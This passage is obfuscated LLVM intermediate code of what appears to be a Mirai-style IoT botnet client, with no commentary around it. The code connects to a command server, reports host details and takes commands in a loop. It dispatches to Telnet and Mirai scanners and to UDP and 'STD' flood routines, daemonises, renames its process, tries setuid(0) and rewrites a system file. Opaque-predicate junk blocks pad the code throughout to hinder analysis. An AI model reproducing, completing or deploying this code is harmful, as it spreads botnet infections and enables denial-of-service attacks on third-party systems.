  %1277 = call i32 @strcmp(i8* %1276, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.511, i32 0, i32 0)) #9
  %1278 = icmp ne i32 %1277, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %1279 = load i8**, i8*** %4, align 8
  %1280 = getelementptr inbounds i8*, i8** %1279, i64 1
  %1281 = load i8*, i8** %1280, align 8
  %1282 = call i32 @strcmp(i8* %1281, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i32 0, i32 0)) #9
  %1283 = icmp ne i32 %1282, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %98
  store i32 1000, i32* %8, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %115
  %1284 = load i32, i32* %5, align 4
  %1285 = icmp ugt i32 %1284, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %140
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %190
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %227
  %1286 = load i32, i32* @mainCommSock, align 4
  %1287 = call i32 (i32, i8*, ...) @sockprintf(i32 %1286, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.515, i32 0, i32 0))
  %1288 = load i32, i32* %10, align 4
  %1289 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %1288, i32 %1289)
  call void @_exit(i32 0) #11
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %249
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %266
  %1290 = load i8**, i8*** %4, align 8
  %1291 = getelementptr inbounds i8*, i8** %1290, i64 0
  %1292 = load i8*, i8** %1291, align 8
  %1293 = call i32 @strcmp(i8* %1292, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.516, i32 0, i32 0)) #9
  %1294 = icmp ne i32 %1293, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %288
  %1295 = load i8**, i8*** %4, align 8
  %1296 = getelementptr inbounds i8*, i8** %1295, i64 1
  %1297 = load i8*, i8** %1296, align 8
  %1298 = call i32 @strcmp(i8* %1297, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i32 0, i32 0)) #9
  %1299 = icmp ne i32 %1298, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %324
  %1300 = load i32, i32* %11, align 4
  store i32 %1300, i32* @scanPid, align 4
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %342
  %1301 = load i32, i32* %11, align 4
  %1302 = icmp eq i32 %1301, -1
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %362
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %384
  %1303 = call i64 @time(i64* null) #5
  %1304 = call i32 @getpid() #5
  %1305 = sext i32 %1304 to i64
  %_ = shl i64 %1303, %1305
  %_51 = shl i64 %1303, %1305
  %_52 = sub i64 0, %1303
  %gen = add i64 %_52, %1305
  %_53 = sub i64 0, %1303
  %gen54 = add i64 %_53, %1305
  %_55 = sub i64 0, %1303
  %gen56 = add i64 %_55, %1305
  %1306 = xor i64 %1303, %1305
  %1307 = call i32 @getppid() #5
  %1308 = sext i32 %1307 to i64
  %_57 = sub i64 %1306, %1308
  %gen58 = mul i64 %_57, %1308
  %_59 = sub i64 0, %1306
  %gen60 = add i64 %_59, %1308
  %1309 = add nsw i64 %1306, %1308
  %1310 = trunc i64 %1309 to i32
  call void @srand(i32 %1310) #5
  %1311 = call i64 @time(i64* null) #5
  %1312 = call i32 @getpid() #5
  %1313 = sext i32 %1312 to i64
  %_61 = sub i64 0, %1311
  %gen62 = add i64 %_61, %1313
  %1314 = xor i64 %1311, %1313
  %1315 = trunc i64 %1314 to i32
  call void @init_rand(i32 %1315)
  %1316 = load i32, i32* %14, align 4
  call void @MiraiScanner(i32 100, i32 %1316)
  call void @_exit(i32 0) #11
  br label %originalBB50

originalBB66alteredBB:                            ; preds = %originalBB66, %419
  %1317 = load i8**, i8*** %4, align 8
  %1318 = getelementptr inbounds i8*, i8** %1317, i64 1
  %1319 = load i8*, i8** %1318, align 8
  %1320 = call i32 @strcmp(i8* %1319, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.513, i32 0, i32 0)) #9
  %1321 = icmp ne i32 %1320, 0
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %470
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %494
  %1322 = load i32, i32* %3, align 4
  %1323 = icmp slt i32 %1322, 6
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %589
  %1324 = load i8**, i8*** %4, align 8
  %1325 = getelementptr inbounds i8*, i8** %1324, i64 5
  %1326 = load i8*, i8** %1325, align 8
  %1327 = call i32 @atoi(i8* %1326) #9
  %1328 = icmp slt i32 %1327, 1
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %641
  %1329 = load i8*, i8** %17, align 8
  %1330 = call i8* @strtok(i8* %1329, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %1330, i8** %23, align 8
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %660
  %1331 = load i8*, i8** %23, align 8
  %1332 = icmp ne i8* %1331, null
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %679
  %1333 = call i32 @listFork()
  %1334 = icmp ne i32 %1333, 0
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %712
  %1335 = load i8*, i8** %17, align 8
  %1336 = load i32, i32* %18, align 4
  %1337 = load i32, i32* %19, align 4
  %1338 = load i32, i32* %20, align 4
  %1339 = load i32, i32* %21, align 4
  %1340 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %1335, i32 %1336, i32 %1337, i32 %1338, i32 %1339, i32 %1340)
  call void @_exit(i32 0) #11
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %751
  %1341 = load i8**, i8*** %4, align 8
  %1342 = getelementptr inbounds i8*, i8** %1341, i64 2
  %1343 = load i8*, i8** %1342, align 8
  %1344 = call i32 @atoi(i8* %1343) #9
  %1345 = icmp eq i32 %1344, -1
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %814
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %831
  store i32 %832, i32* %28, align 4
  %1346 = load i32, i32* %3, align 4
  %1347 = icmp sgt i32 %1346, 5
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %856
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %873
  store i32 %874, i32* %29, align 4
  store i32 32, i32* %30, align 4
  %1348 = load i8*, i8** %24, align 8
  %1349 = call i8* @strstr(i8* %1348, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %1350 = icmp ne i8* %1349, null
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %894
  %1351 = load i8*, i8** %24, align 8
  %1352 = call i8* @strtok(i8* %1351, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %1352, i8** %31, align 8
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %929
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %946
  %1353 = call i32 @listFork()
  %1354 = icmp ne i32 %1353, 0
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %965
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %997
  %1355 = load i32, i32* %3, align 4
  %1356 = icmp slt i32 %1355, 4
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1022
  %1357 = load i8**, i8*** %4, align 8
  %1358 = getelementptr inbounds i8*, i8** %1357, i64 3
  %1359 = load i8*, i8** %1358, align 8
  %1360 = call i32 @atoi(i8* %1359) #9
  %1361 = icmp slt i32 %1360, 1
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1073
  %1362 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %1362, i8** %35, align 8
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1096
  %1363 = load i8*, i8** %32, align 8
  %1364 = load i32, i32* %33, align 4
  %1365 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %1363, i32 %1364, i32 %1365)
  call void @_exit(i32 0) #11
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1116
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1140
  %1366 = load i64, i64* %37, align 8
  %1367 = load i64, i64* @numpids, align 8
  %1368 = icmp ult i64 %1366, %1367
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1182
  %1369 = load i64, i64* %37, align 8
  %_159 = sub i64 %1369, 1
  %gen160 = mul i64 %_159, 1
  %1370 = add i64 %1369, 1
  store i64 %1370, i64* %37, align 8
  br label %originalBB158

originalBB164alteredBB:                           ; preds = %originalBB164, %1205
  br label %originalBB164

originalBB168alteredBB:                           ; preds = %originalBB168, %1223
  %1371 = load i8**, i8*** %4, align 8
  %1372 = getelementptr inbounds i8*, i8** %1371, i64 0
  %1373 = load i8*, i8** %1372, align 8
  %1374 = call i32 @strcmp(i8* %1373, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.523, i32 0, i32 0)) #9
  %1375 = icmp ne i32 %1374, 0
  br label %originalBB168

originalBB172alteredBB:                           ; preds = %originalBB172, %1245
  call void @exit(i32 0) #12
  br label %originalBB172
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %33 [
    i32 66051, label %13
    i32 50462976, label %30
    i32 33751041, label %31
    i32 16777986, label %32
  ]

; <label>:13:                                     ; preds = %0
  %14 = load i32, i32* @x.87
  %15 = load i32, i32* @y.88
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 ptrtoint ([11 x i8]* @.str.528 to i32), i32* %1, align 4
  %22 = load i32, i32* @x.87
  %23 = load i32, i32* @y.88
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:30:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.529 to i32), i32* %1, align 4
  br label %34

; <label>:31:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.530 to i32), i32* %1, align 4
  br label %34

; <label>:32:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.531 to i32), i32* %1, align 4
  br label %34

; <label>:33:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.532 to i32), i32* %1, align 4
  br label %34

; <label>:34:                                     ; preds = %33, %32, %31, %30, %originalBBpart2
  %35 = load i32, i32* %1, align 4
  ret i32 %35

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 ptrtoint ([11 x i8]* @.str.528 to i32), i32* %1, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #5
  store i32 23, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #9
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #9
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #9
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #9
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %61

; <label>:44:                                     ; preds = %36
  %45 = load i32, i32* @x.89
  %46 = load i32, i32* @y.90
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  store i32 0, i32* %1, align 4
  %53 = load i32, i32* @x.89
  %54 = load i32, i32* @y.90
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %61

; <label>:61:                                     ; preds = %originalBBpart2, %43
  %62 = load i32, i32* %1, align 4
  ret i32 %62

originalBBalteredBB:                              ; preds = %originalBB, %44
  store i32 0, i32* %1, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = load i32, i32* @x.91
  %2 = load i32, i32* @y.92
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i32 0, i32 0), i32 513)
  %13 = trunc i32 %12 to i16
  store i16 %13, i16* %9, align 2
  %14 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i32 0, i32 0), i32 0) #5
  %15 = icmp ne i32 %14, -1
  %16 = load i32, i32* @x.91
  %17 = load i32, i32* @y.92
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %48

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* @x.91
  %26 = load i32, i32* @y.92
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.527, i32 0, i32 0), i8** %10, align 8
  %33 = load i8*, i8** %10, align 8
  %34 = call i64 @strlen(i8* %33) #9
  store i64 %34, i64* %11, align 8
  %35 = load i16, i16* %9, align 2
  %36 = zext i16 %35 to i32
  %37 = load i8*, i8** %10, align 8
  %38 = load i64, i64* %11, align 8
  %39 = call i64 @write(i32 %36, i8* %37, i64 %38)
  %40 = load i32, i32* @x.91
  %41 = load i32, i32* @y.92
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %49

; <label>:48:                                     ; preds = %originalBBpart2
  br label %69

; <label>:49:                                     ; preds = %originalBBpart24
  %50 = load i32, i32* @x.91
  %51 = load i32, i32* @y.92
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %49
  %58 = load i16, i16* %9, align 2
  %59 = zext i16 %58 to i32
  %60 = call i32 @close(i32 %59)
  %61 = load i32, i32* @x.91
  %62 = load i32, i32* @y.92
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %69

; <label>:69:                                     ; preds = %originalBBpart28, %48
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %70 = alloca i16, align 2
  %71 = alloca i8*, align 8
  %72 = alloca i64, align 8
  %73 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i32 0, i32 0), i32 513)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %70, align 2
  %75 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i32 0, i32 0), i32 0) #5
  %76 = icmp ne i32 %75, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.527, i32 0, i32 0), i8** %10, align 8
  %77 = load i8*, i8** %10, align 8
  %78 = call i64 @strlen(i8* %77) #9
  store i64 %78, i64* %11, align 8
  %79 = load i16, i16* %9, align 2
  %80 = zext i16 %79 to i32
  %81 = load i8*, i8** %10, align 8
  %82 = load i64, i64* %11, align 8
  %83 = call i64 @write(i32 %80, i8* %81, i64 %82)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %49
  %84 = load i16, i16* %9, align 2
  %85 = zext i16 %84 to i32
  %86 = call i32 @close(i32 %85)
  br label %originalBB6
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %51

; <label>:48:                                     ; preds = %2
  %49 = load i32, i32* %7, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:51:                                     ; preds = %2
  %52 = load i32, i32* %7, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %81, label %54

; <label>:54:                                     ; preds = %51
  %55 = call i32 @fork() #5
  store i32 %55, i32* %8, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %54
  call void @exit(i32 0) #12
  unreachable

; <label>:58:                                     ; preds = %54
  %59 = load i32, i32* %8, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %62, label %61

; <label>:61:                                     ; preds = %58
  br label %63

; <label>:62:                                     ; preds = %58
  br label %63

; <label>:63:                                     ; preds = %62, %61
  %64 = load i32, i32* @x.93
  %65 = load i32, i32* @y.94
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %63
  %72 = load i32, i32* @x.93
  %73 = load i32, i32* @y.94
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %80

; <label>:80:                                     ; preds = %originalBBpart2
  br label %82

; <label>:81:                                     ; preds = %51
  br label %82

; <label>:82:                                     ; preds = %81, %80
  br label %83

; <label>:83:                                     ; preds = %82
  %84 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.534, i32 0, i32 0)) #5
  %85 = call i32 @setuid(i32 0) #5
  %86 = call i32 @seteuid(i32 0) #5
  %87 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %88

; <label>:88:                                     ; preds = %94, %83
  %89 = call i32 @fork() #5
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %661

; <label>:91:                                     ; preds = %88
  %92 = call i32 @initConnection()
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %96

; <label>:94:                                     ; preds = %91
  %95 = call i32 @sleep(i32 5)
  br label %88

; <label>:96:                                     ; preds = %91
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = call i8* @getBuild()
  %99 = call i32 @getEndianness()
  %100 = call i32 (i32, i8*, ...) @sockprintf(i32 %97, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.535, i32 0, i32 0), i8* %98, i32 %99)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %101

; <label>:101:                                    ; preds = %originalBBpart2101, %386, %286, %96
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %104 = call i32 @recvLine(i32 %102, i8* %103, i32 4096)
  store i32 %104, i32* %11, align 4
  %105 = icmp ne i32 %104, -1
  br i1 %105, label %106, label %660

; <label>:106:                                    ; preds = %101
  store i32 0, i32* %12, align 4
  br label %107

; <label>:107:                                    ; preds = %originalBBpart246, %106
  %108 = load i32, i32* @x.93
  %109 = load i32, i32* @y.94
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %107
  %116 = load i32, i32* %12, align 4
  %117 = sext i32 %116 to i64
  %118 = load i64, i64* @numpids, align 8
  %119 = icmp ult i64 %117, %118
  %120 = load i32, i32* @x.93
  %121 = load i32, i32* @y.94
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %119, label %128, label %277

; <label>:128:                                    ; preds = %originalBBpart24
  %129 = load i32, i32* @x.93
  %130 = load i32, i32* @y.94
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %128
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %12, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i32, i32* %137, i64 %139
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @waitpid(i32 %141, i32* null, i32 1)
  %143 = icmp sgt i32 %142, 0
  %144 = load i32, i32* @x.93
  %145 = load i32, i32* @y.94
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
